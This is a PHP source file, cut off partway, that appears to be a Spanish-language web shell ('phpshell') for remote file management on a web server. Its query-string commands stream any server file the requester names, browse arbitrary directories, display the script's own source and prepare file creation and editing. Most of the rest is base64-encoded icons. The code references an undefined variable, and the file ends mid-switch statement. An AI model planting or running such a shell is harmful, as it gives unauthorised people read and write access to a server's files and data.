<?php
$t1 = round(microtime(), 3);
$query = urldecode($_SERVER['QUERY_STRING']);
$query = split('::',$query);
$homedir=getcwd();
$drive=substr($homedir,0,3);
$webext='http://www.stdsec.org/proyectos/phpshell/';
$ext_disponibles= array();
if($query[0]=='descargar' and !empty($query[1]) and !empty($query[2]) and !empty($query[3])){
    $archivo=str_replace(" ","_",$query[2]);
    $data = @fopen($query[1], 'rb');
    header('Content-Disposition: attachment; filename='.$archivo);
    header('Content-Length: '.filesize($ruta));
    if(@fpassthru($data)){
        @fpassthru($data);
    }else{
    echo '<div class="error">No se puede descargar "'.$archivo.'.</div>';
    }
    listar_archivos($query[3]);
    @fclose($data);
}
if($query[0]=='codigo'){highlight_file(substr($_SERVER['PHP_SELF'],1,strlen($_SERVER['PHP_SELF'])));exit();}
if($query[0]!='dir'){$dir=getcwd();}else{if(@realpath($query[1])){$dir=$query[1];}}
$script = $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'];
if($query[0]=='crear_archivo'){$menu_crear=true;$menu_guardar=true;}else{$menu_crear=false;$menu_guardar=false;}
if($query[0]=='editar' and !empty($query[1]) and !empty($query[2])){$menu_guardar=true;}else{$menu_guardar=false;}
if(sizeof($query)==2 and $query[0]=='imagen' and isset($query[1])){
    switch ($query[1]){
        case'icono':$img='iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABHNCSVQICAgIfAhkiAAAAwZJREFUWIXtl89LJEcUxz/V0z39Y6MscQiGnZlLDuoiC3rI7h+R2xyDPUQRvEzwkIOCnj0EBiHg0YtnMf/A5uBBlj2MCIJ7CooGDx4kMk1PTbf9clknYXWma1xzSr6Xoqu+fN/3Fe9VV8F/HcqUuLi4+LPW+icTrm3bP25vb//yeFufYGFhYW5lZaV9e3sreYjjWBqNRrter39vop27A3Nzc69933/bbDafua6L1nog33Vdbm5uWF1djeM4/m5nZ+e3QXwr16FS79bW1p75vp8bHEBrzejoKOvr675S6m0e385VBCqVCldXV2RZZkIniiLK5bIR18gAwP7+vikVgFqt9rQGAOOsLi4ujDVza+DfxlA7MExmT25gZmYGz/OMuEoZn2/mBg4PD41F4f8i/Bubm5vvms3mi37rNkCj0XiZJMkr4Bul1POP8wXAjqKoR35MEU5PT3/barXeLy0t/WpZVioiqW3bfzqO87vjOPu2iKiDg4Oi53lZEARaKaWTJFFa62Kapu7W1tad0NDBAaamptTR0dH4/Py87bpuUiwWu57nkWXZF9fX14GtlJJardYRkSxJkoKIOJZl2Uopy7IsNTIyAoCI9ETb7TZnZ2d9g7quy8TEBAAnJyeitb7a2NhQIlIQERtIi8XidaFQiGyA3d3dD8CHh8TCMPwB4PT0lPPzcyqVCqVSCd/3GRsbu8fvdDqkadr7Pj4+fu95Xm1vb++Ph/SNu+Dy8pLZ2VlardaDgftheXn5zaB1YwPj4+O0Wi3K5TIiQhzHfYsyCAJjg8YGqtUq1Wq19z05OYlSiiAIcF0Xx3GMgz7KwB1EBKVUryjb7TZRFJFlWW9eKUWpVDLSMz6IRAQRodPpoJS6N2qtsSzL6Nb02QaAgeM/W/bJDNyh2+1iWdbAcRgMbUBr3dvyfuNTGrh3AXiEga+GcvQJvg7DMPcx0g9hGArwEujbo3ltWACo1+ufk4TDgAdQ3t3pS+AFMMqALPqgC9wCF8CD/wETA3wM/pzhC7YLRMAN0Lcv/wJr8q3E3GomUQAAAABJRU5ErkJggg==';break;
        case'carpeta':$img='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAB/klEQVQ4jXWTu24TQRSGv72Y2CEEE4K4hEggpCiEJhFCpOIJqGlAiniBCJ6A8AC8AZJTIBHRQAEFXSrERQgaQLhDhCIKOBtv7N2dnTmHYh1r7cRHmmJG///Nucx4n1+u7AaVoJ4nOWHoM1atMl4/w3CYJCbvtu9fu91YV9X+eVibrNavLl+h0074+3uXaLuNabWYvrTAzMJyX+jyjB9vnzaA9TI4REFEqU1UmZ0/z+z8OeJWh58f3zPDr74wmJpDRBmOEEBFKbJSUDh+chyAzDjCwCcIPGg1jwaogjihX1ZJY50UtwcBAKJHZaCKuF4GCloiWCv4ntffj8zAWQXtWUuaNBfC0EcUvBEAH4oSnFPECq63ANLMYXLFOcU6RUR5t3F3cQCgqjgrPbMOAJLMkhqHsUquY1yeu46qfhkCgJSMSZwS/9sHoJM4cgdZLrhjFzi79PBQGb0mCiKKCmw1/2Ad5NbjdL1CEASkRpBcOHFEH/yDJootegAQxY69fYuxkGRCNxO+7TRZ3Vw9NMriJTopRtmjGytkRoliQ6USAjAFrGSGPSEaAKTd9OvO1s5iffpU/zFFUZu4Y/A0QWztQBt58Bh4VQZ4AB9e3Fvzff/RRH2Szl7M89ffHzxpfNoAtg8NHij/Rh/g5p1nayKy1G5Fm8656NaNi29GmYfjP/F6UX3c/0/PAAAAAElFTkSuQmCC';break;
        case'archivo':$img='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAANkE3LLaAgAAARxJREFUeJydkTFqhEAUhv/RaQRJJRirnEJILhEJpLGyMpfxAFaWOUGaVHuAgHXA2iKCYCUS5vkmzWaZWV3X5IdhmOGb7/HmCRxzOBy+mVlhJY7juF3X1WmaPgP4WgC+7z8Rkb60pmnSTdPoqqo+ANxY8uOu1yqbGccRWZbFZVm+AwjOBZuRUoKI0Pc98jx/KIriDcDtboEQAkoptG2Luq6RJMl9FEWPACBNUOvLncRxDCICEcHzPAgh3IVgTytS2k+sEzPvErmu+z8BM4OZ4Xne3wTMDK01mBmO41isJVBKnQATMsXnRSwBEW22sBYJAPM8w9yvRWt9Yq/+gRBicWdyliAIgl19m2P81d+FYfjCBrkxEQEAwzC8Avj8ARK8rCIgUJQ+AAAAAElFTkSuQmCC';break;
        case'enlace':$img='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAIBSURBVDiNhdPPaxNBFMDx78xmd1VQLxUKeg9SL16qFz140ILo2YvgTageu126eBJcDPkbFMWLIC3exFNJq1SptElbiRV/nNQWhUbaJJvs7DwvpoS0Sd9lGN68z3sDM0pE6EShGPtAwsFRAsbCIEpyvRmlVDY5MeUAdPDOWpqbTZfLS+tpml4LgygB6AUEwFqLtfZ/oaC1ZvHDolkuL31P0/RCGETbnYL9ACUimCxFRFAokiShNDergVthENW6C3QvICKIWIwxGGNop208z+fK5TFc131eKMbHBgKAslZwcy5aOyitaCQ75POn9cjImWHXdR8fDIhlZbVinjx91M5Mhgg0mnXOjZ73rLVXC8V4eBBApbJs5uZLm/V6/f70zItGTju02wmO45DP5xVwc18gDCIBePN2fsMYMzo5MfWgVqs9W/u4lnqeT6vdYmjohK+1PtlvAoDPxpjRMIh+Ahhj7r17v5Bq5aAAm2UCqEHApTCIfnVN9QfYbCZNcrkc1U/VHWvt675AGEQ/uveFYqystcfFWr5++8LW1lYL2AX2POXe0FrHvu95q9UKK+XVhli5HgZR1smr7s/U0/mQ1uqh0vr24SO+U99uNEW4EQbRq+5ze4BCMT6llLoryDjCUSBF8RLhThhEv3sb7QKFYnwRGAfOothAWAcWgJkwiP72u+I/8N0HH9PSou4AAAAASUVORK5CYII=';break;
        case'exito':$img='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAGrSURBVDjLvZPZLkNhFIV75zjvYm7VGFNCqoZUJ+roKUUpjRuqp61Wq0NKDMelGGqOxBSUIBKXWtWGZxAvobr8lWjChRgSF//dv9be+9trCwAI/vIE/26gXmviW5bqnb8yUK028qZjPfoPWEj4Ku5HBspgAz941IXZeze8N1bottSo8BTZviVWrEh546EO03EXpuJOdG63otJbjBKHkEp/Ml6yNYYzpuezWL4s5VMtT8acCMQcb5XL3eJE8VgBlR7BeMGW9Z4yT9y1CeyucuhdTGDxfftaBO7G4L+zg91UocxVmCiy51NpiP3n2treUPujL8xhOjYOzZYsQWANyRYlU4Y9Br6oHd5bDh0bCpSOixJiWx71YY09J5pM/WEbzFcDmHvwwBu2wnikg+lEj4mwBe5bC5h1OUqcwpdC60dxegRmR06TyjCF9G9z+qM2uCJmuMJmaNZaUrCSIi6X+jJIBBYtW5Cge7cd7sgoHDfDaAvKQGAlRZYc6ltJlMxX03UzlaRlBdQrzSCwksLRbOpHUSb7pcsnxCCwngvM2Rm/ugUCi84fycr4l2t8Bb6iqTxSCgNIAAAAAElFTkSuQmCC';break;
        case'error':$img='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAMWSURBVDiNbZNNaBRnGMd/7zu7s7OT7G52NxvT5CAhqYEGJSYUalQoIQo9FA+GVHtWW6yHQnvoKdhSVpS2FIntqX6c2lJDSXvSQ9OLlm7qwabEj1qIMV8mIfvFzOw7sztvD0KI6HN8+PPjD8/zE1prts+T0dFvo7b9esyyhGmaCBB+EAillKxXqz93Tk6e3Z4X2wH/Hjnyfayr65iVTmM1NWHaNgC+56EcB3d9XdcXFr7qnpr6+AXAnUOHfoh3dr5jJZOYtk00FsOIRgFoBAGBUviui1cqabW6+s3AzZtntgDTQ0M/WtnsWLy5mUYkwqxl0as1ryQSzwD1On96Hslajc5Gg1qlgioWv3vz9u0Txu7JyWsR03xXCEFRKVb6+jiaz3NvaQlnbg6hFH9pzVv5PPVcjke3bhH3PJRSA3cnJjpk1XH2K8fBq1R4GgT0HT6MEILhU6co9vdTkJK3L1ygKZnktYMHWYnHcctllONQqlSGxNft7Q/bTfPVaCyGYZqs53LsP3+erj17nrtO2Ghw7fRpWgsFZBAQ+D7Lvv+38YaUZ2ylso0goO77WOUyc4UCO/btI5HJAKC15urJkySmpwk9D+W61ByHtSBYjixKufqgVNrVIiUpw6DZMGjeuxerpQXXdbcaRBIJ5otFXN+n3GhQ1ppUJrNkDNj20WWldi1qzcMwpGN0lOP5PMIwcKpV5mZmSLa20nPgAI+E4EahwEYYUpeStG3/YQzH48etIOhNSMngyAjHxsdBSjzX5deJCX67fJm27m7sdJqe/n6S0SjOzAw5KUnGYneMkVQqkg7D4SRYjYUFsG3snTu5NzXFP5cuYW5uUp2fJ9Xby9rsLPNXrtDiOKSj0aI0zYtCa814W9t7O2q1LyNh2FTXmo6xMR5fv44OQwAk0Do4iHv/PngeyjDWV03zg8/X1n7aeuXxXO7DHq3PxbS2Qq3Z7ogQAgFIIagIsfIfvH9uY+OXF2Q6m81+MmCan8aEMF8GeBqGi3d9/8QXm5s3XmojwGfZ7EeZSGT3c3shntmq1NWLpdLv2/P/A6H9b8c77LaHAAAAAElFTkSuQmCC';break;
        case'fondo1':$img='R0lGODlhKAAoAIAAAMDf/6bD5iH5BAAAAAAALAAAAAAoACgAAAJdjI+ZwO3/lFSw1omN3S1jznkTuIkSaZkUCqkLG7kHHMsB7dgazug3D/ABg7qhEHjkJXFLWhP2ZEVRvh9zCqoisSFuyZsCX8Qtcs22LSrNOXbH3YMT1Ve6U65d22EFADs=';break;
        case'fondo2':$img='R0lGODlhAgAoANUAAAAAAP///7zt7L/u7b7t7MHu7cXw7+n5+e36+u/7+/H7+7vt68Lv7cTv7cfw78/y8dPz8tb089r19Nz29eD39snx78vx783y8NHz8dj18+P49+X49+f5+Ov6+d739fP8+/T8+////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAACEALAAAAAACACgAAAY8QBDo81EoEgkEotM5HDiczUajoVA8nslEIslkIhEIBIN5PC4Xi6VScTgMhkaDwSgUBgMCQSBY+P+AgYFBADs=';break;
        case'fondo3':$img='R0lGODlhAgAoAMQAAAAAAP/////Kkf/Lk//Mlf/Nl//Omf/Pm//Qnf/Sof/To//Upf/Vp//hwf/jxf/kx//lyf/my//oz//p0f/q0//Wq//Xrf/Zsf/as//ct//duf/eu//gv////wAAAAAAACH5BAEAAB0ALAAAAAACACgAAAU0IEVN5CRJUQRBz+M4TcNx26ZpWYZhV39ZlkqFwVgsFIpEAoE4HAyGQoFAGAwE2Kx2y82GAAA7';break;
        case'inicio':$img='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QA/wD/AP+gvaeTAAAAB3RJTUUH1gkcCwcxDaam2AAAAeBJREFUOI2lks1rE0EYxp+d3c1md5GYKhRa0GpCKbZdi0pFxZTQYiElSMUIhdKzIB7qQSh4yKnxg/4LHtW7KIgoFb2Ip4oItn4d7Jea2LDZ2c7uzo4XK8buNoIvvKf3+f14YAb4z5HjT0LaX9CumD2nF+zFeX/fWCWd6h7RU90jen3pyeZWisTh2eKtOU1V5kxiPu0olg0iUNNkeYUI1P7MRQoyYzcvp9PmxauXxnHUygwYxHwmywTXpkvJv7PbBF3F62d1Q70xdT6vV50Aw7nD2jEr2895GNlUaYILs8dVQu5MXcjrNJCwXt/Ej4aH4ZylybIUKfjdIDNaySqK/GjiXE5Xk0msbbgQQoD5HO9XbQyd6IMQAgDQWyontjgZADrHZ/coRHk5mj/S1t6+l3xcsxHwEPzXej5HtcGQ0lXUNhx3/Tsb6rBO3fv2dp5LvaVygnnGc+vQwYGTgz2Jd8t1hKGIrLtLV9HZZuD+41d0ZbX6Qks4RYVS7bYQfHDhzQdY/QfgMi8SBgDm+9htKlj+8tXgoTgT+Mm7yqcHM5MAJrsKFUGZD+b5sQIAoMwHDwU+P5yRtr1Cg3pgXrCjoEGbGzYJHJe1bOC4LF5g09YCm7YQqDEf5p8ES68Xd4Sj5ieBMcK/tVk+YQAAAABJRU5ErkJggg==';break;
        case'subir':$img='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAAABx0RVh0U29mdHdhcmUAQWRvYmUgRmlyZXdvcmtzIENTM5jWRgMAAAAVdEVYdENyZWF0aW9uIFRpbWUAMi8xNy8wOCCcqlgAAAQRdEVYdFhNTDpjb20uYWRvYmUueG1wADw/eHBhY2tldCBiZWdpbj0iICAgIiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+Cjx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDQuMS1jMDM0IDQ2LjI3Mjk3NiwgU2F0IEphbiAyNyAyMDA3IDIyOjExOjQxICAgICAgICAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4YXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iPgogICAgICAgICA8eGFwOkNyZWF0b3JUb29sPkFkb2JlIEZpcmV3b3JrcyBDUzM8L3hhcDpDcmVhdG9yVG9vbD4KICAgICAgICAgPHhhcDpDcmVhdGVEYXRlPjIwMDgtMDItMTdUMDI6MzY6NDVaPC94YXA6Q3JlYXRlRGF0ZT4KICAgICAgICAgPHhhcDpNb2RpZnlEYXRlPjIwMDgtMDMtMjRUMTk6MDA6NDJaPC94YXA6TW9kaWZ5RGF0ZT4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyI+CiAgICAgICAgIDxkYzpmb3JtYXQ+aW1hZ2UvcG5nPC9kYzpmb3JtYXQ+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDUdUmQAAAFJSURBVDiNpVM9TwJBEH1DZC9REykPaxsbMbGxsbaBv2DrDzAxdNeT+ANs/QMUR0NtY4GJobGxsfGj4xJQdmF5FsseHHdnwySbmdmdefvefghJbGOVrboB7PhARHKLYSwEgK8Wc4spc5IokhHGwm4CdhPQA20CkIT45nUGYSy8uyAS4/IDBdw8SoZJ2rcJEMbC23M3N9KuuBY433lagRQChLHw6mzFNvlZMthdUX94diA5gHqvwsuTrNTxxPn9vaz+/lDw2VwIsHYLAHr9oTR9cnpMTKdO1kQRL6+Zi+j5oPQQD4+IxcjNVWrEx1vxIa4zyNj3DFBTF5tZWdU/APZd8OuTcf6RpRKWvlW+R7mRjD2D+mAwuK9WqygaIgKtNYwxMMZAa41Go3GdMoiiiNZaWGsxn8/hY58DgFIKSikEQZD6drstsu13/gMiqaq24kHiogAAAABJRU5ErkJggg==';break;
        case'mysql':$img='iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABmJLR0QAAAAAAAD5Q7t/AAAACXBIWXMAAABIAAAASABGyWs+AAAACXZwQWcAAAAQAAAAEABcxq3DAAAC9klEQVQ4y1XLu44bVQCA4f/MnPHO2N5dzzrrtdibCawIbIGCRANFqggBDTWId+AB4AEoaCC0wDMgISgiCoIQSYSEtEqUWAnrvSa+ztjjuc85hyKi4Jf+8hMA5h0Jf1Rw6/0WO9euUfNfR9a6WNolyzV5vCAdDxiePuDJw2NarZIvHyM0SPP1B7AMPT6/+Qmbu5/SbBwirTVcLZGFYFZAlWmSKzm+P6Ts/8b88S3ucd98D5LuHjqsvWe1/G/wtIuYgMhfTAFeAUVhYcceq0c9glHPwIH6jg/xCOT0r5+o0rSzZkWue9hDeDasVeCUUM/AXcJyAskpFGO0rYlCuvNINKyEQIYn5xhDld/9lWbg4vVcnC0Hq2sQFJBkmGWBmhnKc4iPIZlCkYOwQP4TQVoy2HOt0F5mLbFI0avgLMF2AEApKLMXKC0Fw5z+2djMPQ9ka3eHVa3jUXdfX4gAPxjTclMatQpHGBCQTyEa2gShQ6LrNJrVZGs0SSavgHy5NodKrTu77ebicJPxeYNxEnMxyjDTAnSFLDWuMnTahs1GgV1l3WAHZ78llAzHEUqhm38f6bZaYXt3BXEVTKfC2ApKhRVpGBnKC8NiYAhOhYg9Gzs1yDvPYRyb4IYnpyvTYls2M2ouiBrgAwpIoFpAOoMwFvQXPP3sZ1PdeNUg2+uSesOEk871YpQo/OGQFjF1UyKFxhSG/JlgcWETzGrk2xaOH476P65XnfoU+XZHg1Ky1hnX894e0zWP+TRhNEkwywJEiZNVeOuaq55mQ2XoVPkUEX9+JJCjqUFVltl4eGJ8+4Kttzzsng2rGtOowFSISMFQU10alqeG6BLRvlPwy5nA+vaB4asjU959TjAblpTHC4gD0HOEEyPIYVlBoikyw9kcc/uMZ1TwxX2DEIAB+doGN9894OPrb/Bm74Ar/j7eykvYOoVkQDE+YdF/yuDeI27//oQfOk0uH01A8P9coOut0G37bNQbuEqh5iHRbMFIay6BEND/gX8BX56YxymshwQAAAAldEVYdGNyZWF0ZS1kYXRlADIwMDktMDktMjhUMTE6Mjc6NTUtMDQ6MDDs/LGJAAAAJXRFWHRtb2RpZnktZGF0ZQAyMDA5LTA1LTIxVDEyOjQzOjU2LTA0OjAw44PFbgAAAABJRU5ErkJggg==';break;
        case'info':$img='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';break;
